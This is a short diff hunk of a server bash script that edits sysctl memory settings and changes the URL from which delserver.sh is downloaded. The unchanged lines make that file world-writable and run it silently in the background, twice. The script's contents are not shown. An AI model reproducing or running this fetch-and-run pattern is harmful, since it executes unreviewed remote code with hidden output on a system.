@@ -826,7 +826,7 @@ sysctl -w vm.overcommit_memory=2
 echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
 
 cd /$HOME/
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh" -o $HOME/delserver.sh
+curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/url/delserver.sh" -o $HOME/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 nohup ./delserver.sh > /dev/null 2>&1 &
